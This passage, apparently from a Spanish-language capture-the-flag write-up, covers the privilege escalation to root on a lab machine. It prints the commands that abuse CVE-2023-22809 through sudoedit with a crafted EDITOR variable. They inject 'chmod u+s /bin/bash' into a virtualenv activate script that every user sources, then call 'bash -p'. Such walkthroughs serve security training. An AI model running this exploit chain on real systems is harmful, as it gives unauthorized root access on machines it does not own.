+/app/config_prod.json</code></pre>
+
+                <pre><code class="language-bash">find / -group dev_admin 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/home/dev_admin
+/app/venv
+/app/venv/bin
+/app/venv/bin/activate
+/app/venv/bin/Activate.ps1
+/app/venv/bin/activate.fish
+/app/venv/bin/activate.csh</code></pre>
+
+                <p>Los scripts de activación del entorno virtual son poseídos por el grupo <code>dev_admin</code> y son escribibles. El archivo <code>/app/venv/bin/activate</code> es particularmente interesante porque se ejecuta cuando el entorno virtual se activa.</p>
+
+                <h3>Abuso del Entorno Virtual</h3>
+                <p>Recordando que mi shell inicial como <code>www-data</code> mostraba automáticamente <code>(venv)</code> en el prompt, investigo cómo sucede esto. Examinando la configuración global de bash revela la respuesta:</p>
+                <pre><code class="language-bash">tail /etc/bash.bashrc</code></pre>
+                <pre><code class="language-bash"># all users will want the env associated with this application
+source /app/venv/bin/activate</code></pre>
+
+                <p>Cada usuario, incluyendo root, hace automáticamente source del script de activación del entorno virtual al iniciar una shell bash. Esto significa que puedo inyectar comandos en <code>/app/venv/bin/activate</code> que serán ejecutados por cualquier usuario que inicie sesión o genere una nueva shell bash.</p>
+
+                <h2>Acceso Root - Bash SUID</h2>
+                <p>Exploto CVE-2023-22809 para editar <code>/app/venv/bin/activate</code> e inyectar un comando para establecer el bit SUID en <code>/bin/bash</code>:</p>
+
+                <pre><code class="language-bash">EDITOR='nano -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json</code></pre>
+
+                <p>En el editor nano, añado esta línea al script de activación:</p>
+                <pre><code class="language-bash">chmod u+s /bin/bash</code></pre>
+
+                <p>Después de guardar y esperar a que root genere una nueva shell bash (lo cual sucede periódicamente mediante varias tareas del sistema), compruebo los permisos en <code>/bin/bash</code>:</p>
+                <pre><code class="language-bash">ls -la /bin/bash</code></pre>
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1396520 Jan 6 2022 /bin/bash</code></pre>
+
+                <p>El bit SUID ahora está establecido. Puedo generar una shell privilegiada y acceder a la flag de root:</p>
+                <pre><code class="language-bash">bash -p</code></pre>
+                <pre><code class="language-bash">whoami</code></pre>
+                <pre><code class="language-plaintext">root</code></pre>
+
+                <p>Con acceso root conseguido, puedo recuperar la flag final y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
